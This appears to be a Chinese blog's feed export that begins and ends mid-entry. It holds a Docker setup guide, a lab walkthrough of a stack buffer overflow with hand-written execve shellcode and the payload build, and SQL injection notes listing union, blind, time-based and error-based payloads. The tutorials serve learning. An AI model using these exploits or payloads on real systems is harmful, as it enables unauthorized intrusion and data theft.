class="line">MacOS：https://docs.docker.com/docker-for-mac/install/</span><br><span class="line">Windows：https://docs.docker.com/docker-for-windows/install/</span><br><span class="line">Ubuntu：https://docs.docker.com/install/linux/docker-ce/ubuntu/</span><br><span class="line">Debian：https://docs.docker.com/install/linux/docker-ce/debian/</span><br><span class="line">CentOS：https://docs.docker.com/install/linux/docker-ce/centos/</span><br><span class="line">Fedora：https://docs.docker.com/install/linux/docker-ce/fedora/</span><br><span class="line">其他 Linux 发行版：https://docs.docker.com/install/linux/docker-ce/binaries/</span><br></pre></td></tr></table></figure><p>官方文档的安装方式是最靠谱的,但是在国内墙是硬伤…</p><p>我的实验环境是Ubuntu 18.04 64，2核4GB ECS服务器</p><p>首先，卸载旧版本，Ubuntu的旧版本称为 docker，docker.io 或 docker.engine(通过apt安装的为旧版本，建议新版)。<br><code>$ sudo apt-get remove docker docker-engine docker.io containerd runc</code></p><p>在新主机上首次安装Docker Engine-Community之前，需要设置Docker存储库。之后，可以从存储库安装和更新Docker。</p><p>设置存储库<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">//更新apt包索引</span><br><span class="line">$ sudo apt-get update</span><br><span class="line">//安装软件包以允许apt通过HTTPS使用存储库</span><br><span class="line">$ sudo apt-get install \</span><br><span class="line">    apt-transport-https \</span><br><span class="line">    ca-certificates \</span><br><span class="line">    curl \</span><br><span class="line">    gnupg-agent \</span><br><span class="line">    software-properties-common</span><br><span class="line">//添加Docker的官方GPG密钥（我用的是阿里内网开源镜像站源）：</span><br><span class="line">$ curl -fsSL https://mirrors.cloud.aliyuncs.com/docker-ce/linux/ubuntu/gpg | sudo apt-key add -</span><br><span class="line"></span><br><span class="line">$ sudo add-apt-repository \</span><br><span class="line">&quot;deb [arch=amd64] http://mirrors.cloud.aliyuncs.com/docker-ce/linux/ubuntu \</span><br><span class="line">$(lsb_release -cs) \</span><br><span class="line">stable&quot;</span><br></pre></td></tr></table></figure></p><p>安装Docker CE</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ sudo apt-get update</span><br><span class="line"></span><br><span class="line">//安装最新版docker CE和containerd，或者采用下面的方式安装指定版本</span><br><span class="line"></span><br><span class="line">$ sudo apt-get install docker-ce docker-ce-cli containerd.io</span><br><span class="line"></span><br><span class="line">//$ apt-cache madison docker-ce</span><br><span class="line"></span><br><span class="line">//$ sudo apt-get install docker-ce=&lt;VERSION_STRING&gt; docker-ce-cli=&lt;VERSION_STRING&gt; containerd.io</span><br></pre></td></tr></table></figure><h2 id="Docker常用命令"><a href="#Docker常用命令" class="headerlink" title="Docker常用命令"></a>Docker常用命令</h2><p>我们可以通过 docker -h 去查看命令的详细的帮助文档。在这里我只列出一些平常我们可能会用的比较多的一些命令。</p><p>首先，我们需要开启docker服务：</p><p><code>service docker start</code></p><p>我们需要拉取一个 docker 镜像，我们可以用如下命令：</p><p><code>docker pull image_name</code></p><p>image_name 为镜像的名称，而如果我们想从 Docker Hub 上去下载某个镜像，我们可以使用以下命令：</p><p><code>docker pull centos:latest</code></p><p>centos:lastest 是镜像的名称， Docker daemon 发现本地没有我们需要的镜像，会自动去 Docker Hub 上去下载镜像，下载完成后，该镜像被默认保存到 /var/lib/docker 目录下。</p><p>接着我们如果想查看下主机下存在多少镜像，我们可以用如下命令：</p><p><code>docker images</code></p><p>我们要想知道当前有哪些容器在运行，我们可以用如下命令：</p><p><code>docker ps -a</code></p><p>-a 是查看当前所有的容器，包括未运行的</p><p>我们相对一个容器进行启动，重启和停止，可以使用如下命令：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">docker start container_name/container_id</span><br><span class="line"></span><br><span class="line">docker restart container_name/container_id</span><br><span class="line"></span><br><span class="line">docker stop container_name/container_id</span><br></pre></td></tr></table></figure></p><p>这个时候我们如果想进入到这个容器中，我们可以使用 attach 命令：</p><p><code>docker attach container_name/container_id</code></p><p>那如果我们想运行这个容器中的镜像的话，并且调用镜像里面的 bash ，我们可以使用如下命令：</p><p><code>docker run -t -i container_name/container_id /bin/bash</code></p><p>那如果这个时候，我们想删除指定镜像的话，由于 image 被某个 container 引用（拿来运行），如果不将这个引用的 container 销毁（删除），那 image 肯定是不能被删除。我们首先得先去停止这个容器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps</span><br><span class="line"></span><br><span class="line">docker stop container_name/container_id</span><br></pre></td></tr></table></figure><p>然后我们用如下命令去删除这个容器：</p><p><code>docker rm container_name/container_id</code></p><p>然后这个时候我们再去删除这个镜像：</p><p><code>docker rmi image_name</code></p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li><a href="&quot;http://dockone.io/article/8350&quot;">这可能是最为详细的Docker入门总结</a></li><li><a href="&quot;https://docs.docker.com/install/&quot;">Docker官方文档</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img width=&quot;700px&quot; height=&quot;400px&quot; src=&quot;http://q7bvs3hjk.bkt.clouddn.com/static/images/paw5.jpg&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="知识总结" scheme="http://bleaner.club/categories/%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="linux" scheme="http://bleaner.club/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>pwn入门学习（二）—— 基于经典堆栈的缓冲区溢出与shellcode的编写</title>
    <link href="http://bleaner.club/2020/01/22/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%20%E5%9F%BA%E4%BA%8E%E7%BB%8F%E5%85%B8%E5%A0%86%E6%A0%88%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B8%8Eshellcode%E7%9A%84%E7%BC%96%E5%86%99/"/>
    <id>http://bleaner.club/2020/01/22/pwn%E5%85%A5%E9%97%A8%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%BA%8C%EF%BC%89%E2%80%94%E2%80%94%20%E5%9F%BA%E4%BA%8E%E7%BB%8F%E5%85%B8%E5%A0%86%E6%A0%88%E7%9A%84%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E4%B8%8Eshellcode%E7%9A%84%E7%BC%96%E5%86%99/</id>
    <published>2020-01-21T16:00:00.000Z</published>
    <updated>2020-03-17T12:12:37.528Z</updated>
    
    <content type="html"><![CDATA[</p><h1 id="pwn入门学习（二）——-基于经典堆栈的缓冲区溢出与shellcode的编写"><a href="#pwn入门学习（二）——-基于经典堆栈的缓冲区溢出与shellcode的编写" class="headerlink" title="pwn入门学习（二）—— 基于经典堆栈的缓冲区溢出与shellcode的编写"></a>pwn入门学习（二）—— 基于经典堆栈的缓冲区溢出与shellcode的编写</h1><p><strong>实验环境：Ubuntu 18.04(x86-64)</strong></p><h2 id="0x00-实验原理"><a href="#0x00-实验原理" class="headerlink" title="0x00 实验原理"></a>0x00 实验原理</h2><blockquote><p>1.什么是栈溢出？</p></blockquote><p>在计算机安全领域，缓冲区溢出是个古老而经典的话题。众所周知，计算机程序的运行依赖于函数调用栈。栈溢出是指在栈内写入超出长度限制的数据，从而破坏程序运行甚至获得系统控制权的攻击手段。</p><blockquote><p>2.函数调用栈的相关知识</p></blockquote><p>函数调用栈是指程序运行时内存一段连续的区域，用来保存函数运行时的状态信息，包括函数参数与局部变量等。称之为“栈”是因为发生函数调用时，调用函数（caller）的状态被保存在栈内，被调用函数（callee）的状态被压入调用栈的栈顶；在函数调用结束时，栈顶的函数（callee）状态被弹出，栈顶恢复到调用函数（caller）的状态。函数调用栈在内存中从高地址向低地址生长，所以栈顶对应的内存地址在压栈时变小，退栈时变大。<br><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/docker/pwn1.png" alt></p><p>函数状态主要涉及三个寄存器－－rsp，rbp，rip。rsp 用来存储函数调用栈的栈顶地址，在压栈和退栈时发生变化。rbp 用来存储当前函数状态的基地址，在函数运行时不变，可以用来索引确定函数参数或局部变量的位置。rip 用来存储即将执行的程序指令的地址，cpu 依照 rip 的存储内容读取指令并执行，rip 随之指向相邻的下一条指令，如此反复，程序就得以连续执行指令。</p><blockquote><p>3.不安全的函数</p></blockquote><p>栈溢出漏洞是由于使用了不安全的函数，如 C 中的 ，read,scanf, strcpy等，通过构造特定的数据使得栈溢出，从而导致程序的执行流程被控制。</p><h2 id="0x01-源程序"><a href="#0x01-源程序" class="headerlink" title="0x01 源程序"></a>0x01 源程序</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">        /* [1] */ char buf[256];</span><br><span class="line">        /* [2] */ strcpy(buf,argv[1]);</span><br><span class="line">        /* [3] */ printf(&quot;Input:%p\n&quot;,buf);</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>漏洞利用就是控制程序去执行我们想要它执行的代码。这个漏洞主要是利用覆盖eip来实现。</p><p>1.首先，关闭ASLR(程序地址随机化)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br><span class="line"></span><br><span class="line">//关闭地址随机化后，每次运行程序，buf的地址是不变的。</span><br></pre></td></tr></table></figure></p><p>2.编译，给程序可执行权限</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</span><br><span class="line">$sudo chmod +s vuln</span><br></pre></td></tr></table></figure><h2 id="0x02-寻找溢出点，计算返回地址"><a href="#0x02-寻找溢出点，计算返回地址" class="headerlink" title="0x02 寻找溢出点，计算返回地址"></a>0x02 寻找溢出点，计算返回地址</h2><p>看一下main函数的反汇编：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disassemble main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001145 &lt;+0&gt;:     push   %rbp</span><br><span class="line">   0x0000000000001146 &lt;+1&gt;:     mov    %rsp,%rbp</span><br><span class="line">   0x0000000000001149 &lt;+4&gt;:     sub    $0x110,%rsp</span><br><span class="line">   0x0000000000001150 &lt;+11&gt;:    mov    %edi,-0x104(%rbp)</span><br><span class="line">   0x0000000000001156 &lt;+17&gt;:    mov    %rsi,-0x110(%rbp)</span><br><span class="line">   0x000000000000115d &lt;+24&gt;:    mov    -0x110(%rbp),%rax</span><br><span class="line">   0x0000000000001164 &lt;+31&gt;:    add    $0x8,%rax</span><br><span class="line">   0x0000000000001168 &lt;+35&gt;:    mov    (%rax),%rdx</span><br><span class="line">   0x000000000000116b &lt;+38&gt;:    lea    -0x100(%rbp),%rax</span><br><span class="line">   0x0000000000001172 &lt;+45&gt;:    mov    %rdx,%rsi</span><br><span class="line">   0x0000000000001175 &lt;+48&gt;:    mov    %rax,%rdi</span><br><span class="line">   0x0000000000001178 &lt;+51&gt;:    callq  0x1030 &lt;strcpy@plt&gt;</span><br><span class="line">   0x000000000000117d &lt;+56&gt;:    lea    -0x100(%rbp),%rax</span><br><span class="line">   0x0000000000001184 &lt;+63&gt;:    mov    %rax,%rsi</span><br><span class="line">   0x0000000000001187 &lt;+66&gt;:    lea    0xe76(%rip),%rdi        # 0x2004</span><br><span class="line">   0x000000000000118e &lt;+73&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x0000000000001193 &lt;+78&gt;:    callq  0x1040 &lt;printf@plt&gt;</span><br><span class="line">   0x0000000000001198 &lt;+83&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x000000000000119d &lt;+88&gt;:    leaveq </span><br><span class="line">   0x000000000000119e &lt;+89&gt;:    retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></p><p>注意，buf的地址不一定使从$rsp指向的位置开始的，源代码中申请了256个字节的栈空间，但编辑器分配了0x110=272自己二(指令地址 0x001149)<br>先看指令地址 0x001175: 根据调用规约，strcpy函数的第一个参数由$rdi传递，$rdi的值来自$rax<br>再看指令地址 0x00116b: $rax的值是$rbp-0x100, 即buf的地址并不是从$rsp开始，而是从$rsp向上16字节开始。<br>这是一个重要的细节，他将直接影响后面对return_addr位置的计算。</p><p>通过buf的地址，再结合反汇编，即可推测出return_addr的位置</p><p><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/docker/pwn2.png" alt></p><p>图中很容易看出，return_addr的位置在buf+256+8处，即只需要把buf+264后面的8个字节写上shellcode的地址。</p><p>那么return_addr里面具体要填多少呢？<br>因为没有了地址随机化，每次buf的地址是固定的，给buf传递272个字节，看看他的地址是多少。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# ./vuln `python -c &quot;print(&apos;a&apos;*272)&quot;`</span><br><span class="line">Input:0x7fffffffdf70</span><br><span class="line">段错误</span><br></pre></td></tr></table></figure></p><p>OK，我们拿到了buf的运行时的地址：0x7fffffffdf70，这个地址就是要硬编码到shellcode中的返回地址。</p><blockquote><p>这里有个小细节令人很诧异：传递参数的长度不同，buf的地址居然不同，怎么回事，说好了没有地址随机化的？！<br>其实地址随机化确实已经关闭了，但因为我们是通过main函数的argv传参，参数本身也会占用栈空间，导致main函数局部变量的地址变化，参数长度越长，buf的地址会越小。<br>翻到前面看一下栈帧的图片，命令行参数，是位于main函数栈帧上面的。</p></blockquote><p>我们需要构建这样一段数据：共272个字节，前264是shellcode，后8个是return_addr(0x7fffffffdf70)</p><h2 id="0x03构造shellcode"><a href="#0x03构造shellcode" class="headerlink" title="0x03构造shellcode"></a>0x03构造shellcode</h2><p>shellcode就是一段被精心构造的攻击代码，用来达成攻击者的目的。<br>如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">.section .text</span><br><span class="line">.global _start</span><br><span class="line">_start:</span><br><span class="line">jmp str</span><br><span class="line">entry_point: </span><br><span class="line">pop %rcx</span><br><span class="line"></span><br><span class="line">mov %rcx, %rbx</span><br><span class="line">add $7, %rbx</span><br><span class="line">xor %rax, %rax</span><br><span class="line">mov %rax, (%rbx)</span><br><span class="line"></span><br><span class="line">xor %rdx, %rdx</span><br><span class="line">xor %rsi, %rsi</span><br><span class="line">mov %rcx, %rdi</span><br><span class="line">add $59, %rax</span><br><span class="line">syscall</span><br><span class="line"></span><br><span class="line">str:</span><br><span class="line">call entry_point</span><br><span class="line">.ascii &quot;/bin/sh&quot;</span><br></pre></td></tr></table></figure></p><p>原理就是通过59号系统调用execve传参并发起系统调用请求。<br>详情可参考<a href="https://blog.csdn.net/u010394865/article/details/82730411" target="_blank" rel="noopener">栈溢出攻击和shellcode</a></p><p>代码保存成shellcode.asm, 汇编并链接该程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">as -o shellcode.o shellcode.asm </span><br><span class="line">ld -o shellcode shellcode.o</span><br></pre></td></tr></table></figure></p><p>接下来需要把shellcode进程的代码段dump出来，使用objdump工具查看代码段信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# objdump -h shellcode</span><br><span class="line"></span><br><span class="line">shellcode：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line">节：</span><br><span class="line">Idx Name          Size      VMA         LMA        File off     Algn</span><br><span class="line">  0 .text         0000002b  401000     401000      1000       2**0</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, READONLY, CODE</span><br></pre></td></tr></table></figure></p><p>得到信息：偏移0x1000 = 4096 字节，长度为 0x2b = 43字节。</p><p>用dd命令导出这段数据，随便起个名字叫shitcode:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# dd if=shellcode of=shitcode bs=1 count=43 skip=4096</span><br><span class="line">记录了43+0 的读入</span><br><span class="line">记录了43+0 的写出</span><br><span class="line">43 bytes copied, 0.000511266 s, 84.1 kB/s</span><br></pre></td></tr></table></figure></p><p>root@kali:~/Desktop# hexdump -C shitcode<br>00000000  eb 1d 59 48 89 cb 48 83  c3 07 48 31 c0 48 89 03<br>00000010  48 31 d2 48 31 f6 48 89  cf 48 83 c0 3b 0f 05 e8<br>00000020  de ff ff ff 2f 62 69 6e  2f 73 68<br>0000002b<br>这就是shellcode的核心，运行这段代码，他就会请求kernel为我们启动一个shell<br>注意看hexdump的输出：这段shellcode中是不包含0字符的，这个条件是必须要满足的，因为几乎所有的输入函数，都是以0字符作为结束标志。shellcode中包含0字符会导致输入函数提前返回，注入失败。</p><blockquote><p>如果你写的shellcode编译后发现有0字符，需要想办法替换成不含0字符的同义指令。比如 mov $0, %rax 可以改写成 xor %rax, %rax</p></blockquote><h2 id="构建完备的exp"><a href="#构建完备的exp" class="headerlink" title="构建完备的exp"></a>构建完备的exp</h2><p>我们已经构建了exp的核心代码，只需将shitcode后面追加8字节的return_addr，并在文件开头填充nop(机器码\x90)，使文件刚好272字节即可<br>操作如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# echo -n -e `python -c &quot;print(&apos;\x90&apos;*221)&quot;` &gt; exp</span><br><span class="line">root@kali:~/Desktop# echo -n -e `cat shitcode` &gt;&gt; exp</span><br><span class="line">root@kali:~/Desktop# echo -n -e `python -c &quot;import pwn;print(pwn.p64(0x7fffffffdf70))&quot;` &gt;&gt; exp</span><br></pre></td></tr></table></figure></p><p>看一下exp的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# hexdump -C exp</span><br><span class="line">00000000  90 90 90 90 90 90 90 90  90 90 90 90 90 90 90 90  |................|</span><br><span class="line">*</span><br><span class="line">000000d0  90 90 90 90 90 90 90 90  90 90 90 90 90 eb 1d 59  |...............Y|</span><br><span class="line">000000e0  48 89 cb 48 83 c3 07 48  31 c0 48 89 03 48 31 d2  |H..H...H1.H..H1.|</span><br><span class="line">000000f0  48 31 f6 48 89 cf 48 83  c0 3b 0f 05 e8 de ff ff  |H1.H..H..;......|</span><br><span class="line">00000100  ff 2f 62 69 6e 2f 73 68  70 ff ff ff 7f 00 00     |./bin/shp......|</span><br></pre></td></tr></table></figure></p><p>刚好272个字节，</p><p>试用一下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop# ./vuln `cat exp`</span><br><span class="line">Input:0x7fffffffdf50</span><br><span class="line"># pwd</span><br><span class="line">/root/Desktop</span><br><span class="line">#</span><br></pre></td></tr></table></figure></p><p>大功告成！</p><hr><p>萌新刚刚接触pwn，从网上借鉴(<del>抄袭</del>)了很多大佬的经验，<br>如有侵权,联系删除。<br>本篇笔记主要参考了<a href="https://blog.csdn.net/u010394865/article/details/82730411" target="_blank" rel="noopener">这篇博客</a><br>我只是把我的实验过程和学习到的东西记了下来，如果还有疑问可以看上面的博客，大佬讲的真的很详细(orz)</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img width=&quot;700px&quot; height=&quot;400px&quot; src=&quot;http://q7bvs3hjk.bkt.clouddn.com/static/images/paw4.png&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="知识总结" scheme="http://bleaner.club/categories/%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="二进制" scheme="http://bleaner.club/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
      <category term="linux" scheme="http://bleaner.club/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>Sql盲注</title>
    <link href="http://bleaner.club/2019/11/22/sql%E7%9B%B2%E6%B3%A8/"/>
    <id>http://bleaner.club/2019/11/22/sql%E7%9B%B2%E6%B3%A8/</id>
    <published>2019-11-21T16:00:00.000Z</published>
    <updated>2020-03-17T12:14:16.853Z</updated>
    
    <content type="html"><![CDATA[</p><h1 id="SQL盲注注入"><a href="#SQL盲注注入" class="headerlink" title="SQL盲注注入"></a>SQL盲注注入</h1><p>盲注是注入的一种，指的是在不知道数据库返回值的情况下对数据中的内容进行猜测，实施SQL注入。盲注一般分为布尔盲注和基于时间的盲注和报错的盲注。</p><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>用到的函数</p><blockquote><p>Length（）函数 返回字符串的长度<br>Substr（）截取字符串 从1开始<br>Ascii（）返回字符的ascii码<br>sleep(n)：将程序挂起一段时间 n为n秒<br>if(expr1,expr2,expr3):判断语句 如果第一个语句正确就执行第二个语句如果错误执行第三个语句</p></blockquote><p>当然如果上面的函数被禁用，也有相应的函数替换。可百度<br>布尔型：页面只返回True和False两种类型页面。利用页面返回不同，逐个猜解数据</p><h3 id="测试页面"><a href="#测试页面" class="headerlink" title="测试页面"></a>测试页面</h3><p><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/docker/sqlm1.png" alt></p><p>get一个参数id=1，返回true界面<br><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/docker/sqlm2.png" alt><br>id=1’ and 1=2%23，返回false页面</p><p>到这里初步确定单引号存在注入，TRUE页面有’you are in………..‘，FALSE页面不存在’you are in ……..‘<br> 源代码：<br><code>$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;</code>;验证确实是由于单引号闭合导致注入漏洞。后台执行结果SELECT * FROM users WHERE id=’1’’ 原因单引号在闭合后还存在一个单引号。会引起查询报错<br>知道为盲注布尔型注入，利用上面的函数进行猜解。</p><p>1.判断数据库长度<br><code>/index.php?id=1&#39; and length(database())&gt;8%23</code>      返回FALSE<br><code>/index.php?id=1&#39; and length(database())&gt;7%23</code>      返回TRUE<br>length(database)=8<br>2.爆出数据库名字<br>2.1第一个数据库长度<br><code>id=1&#39; and length((select schema_name from information_schema.schemata limit 0,1))&gt;18%23</code>   返回False<br><code>id=1&#39; and length((select schema_name from information_schema.schemata limit 0,1))&gt;17%23</code>   返回True<br>故第一个数据库长度为18<br>2.2第一个数据库名<br>2.2.1第一个字母<br>substr(“pikachuu”,1,1)=’p’<br><code>id=1&#39; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;104</code>  返回True<br><code>id=1&#39; and ascii(substr((select schema_name from information_schema.schemata limit 0,1),1,1))&gt;105</code>  返回False<br>（实际用二分法查找）<br>ascii(‘i’)=105，所以第一个字母为’i’<br>原理就是这样，接着用脚本跑一下就ok了<br>3.查表、查列、查字段</p><hr><h2 id="延时盲注"><a href="#延时盲注" class="headerlink" title="延时盲注"></a>延时盲注</h2><p>是由返回响应的时间判断的。利用此函数sleep（）与if()<br>判断：?id=1’ and sleep(5)%23 响应时间5秒存在延时注入<br>查数据库<br>?id=1’and if((ascii(substr(database(),1,1))&gt;114) ,sleep(5),0)%23<br>其他操作语法与布尔型一样。</p><hr><h2 id="基于报错的盲注"><a href="#基于报错的盲注" class="headerlink" title="基于报错的盲注"></a>基于报错的盲注</h2><p>基于报错的盲注是通过输入特定语句使页面报错，网页中则会输出相关错误信息，从而是我们得到想要的基本信息——数据库名、版本、用户名等</p><p>1.直接使用报错：<br><code>&#39; union select 1,count(*),concat(&#39;/&#39;,(select database()),&#39;/&#39;,floor(rand(0)*2))a from information_schema.columns group by a--+</code></p><p>这里格式貌似几乎固定，相当于这样输就会出错的bug，count()用来返回有多少条数据这里固定写法，中间select后面是我们要获得的信息，<br>floor(rand(0)*2)也是固定写法，floor用来取不大于括号里的最大整数，比如1.5取1，后面的a和最后的a只要是相等的字符就可以，如图<br><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/docker/sqlm3.png" alt></p><p>注意返回值不能超过一行，如果多行数据加limit<br>2.利用xpath函数-extractvalue报错<br>payload：<br><code>&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e))--+</code></p><p>这也是一种类似bug的固定写法，extractvalue，concat里面第一个必须是0x7e，后面是要查的内容，concat里面可以放很多参数（参见目录），所以可以多查很多数据，如图：<br><code>?id=1&#39; and extractvalue(1,concat(0x7e,(select database()),0x7e,user()))--+</code><br><img src="http://q7bvs3hjk.bkt.clouddn.com/static/images/docker/sqlm4.png" alt></p><p>3.利用xpath函数—updatexml报错：<br>payload:<br><code>&#39; or updatexml(1,concat(0x7e,(select database()),0x7e),1)--+</code></p><p>与extractvalue同理，这里不再赘述</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img width=&quot;700px&quot; height=&quot;400px&quot; src=&quot;http://q7bvs3hjk.bkt.clouddn.com/static/images/fork.jpg&quot;&gt;&lt;br&gt;
    
    </summary>
    
    
      <category term="知识总结" scheme="http://bleaner.club/categories/%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/"/>
    
    
      <category term="web安全" scheme="http://bleaner.club/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Sql注入总结</title>
    <link href="http://bleaner.club/2019/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
    <id>http://bleaner.club/2019/11/22/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</id>
    <published>2019-11-21T16:00:00.000Z</published>
    <updated>2020-03-17T10:07:41.761Z</updated>
    
    <content type="html"><![CDATA[</p><h1 id="Sql注入总结"><a href="#Sql注入总结" class="headerlink" title="Sql注入总结"></a>Sql注入总结</h1><h2 id="sql注入类型"><a href="#sql注入类型" class="headerlink" title="sql注入类型"></a>sql注入类型</h2><h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><p>1、利用闭合变量报错测试注入点， <code>?id=1’</code>这样说明存在单引号闭合注入<br>2、是否存在注入点，用and语句测试<br><code>?id=1’ and 1=2# ?id=1’ and 1=1#</code><br>3、猜测字段<br><code>?id=1’ order by 3%23</code><br>4、找到页面中数据输入点<br> <code>?id=-1’ union select 1,2,3%23</code><br>5、查数据库<br><code>?id=1’ union select 1,schema_name from information_schema.schemata,3%23</code><br>6、查表<br><code>?id=-1’ union select 1,table_name,3 from information_schema.tables where table_schema=database()%23</code><br>7、查字段<br><code>?id=-1’ union select 1,column_name,3 from information_schema.columns where table_schema=database() and table_name=&#39;表名&#39;%23</code><br>8、查数据<br><code>?id=-1’ union select 1,flag,3 from 数据库.表名%23</code></p><h3 id="布尔型"><a href="#布尔型" class="headerlink" title="布尔型"></a>布尔型</h3><p>1、判断是否存在注入点<br><code>?id=1’ and 1=1%23</code>（返回ture页面）<br><code>?id=1’ and 1=2%23</code> 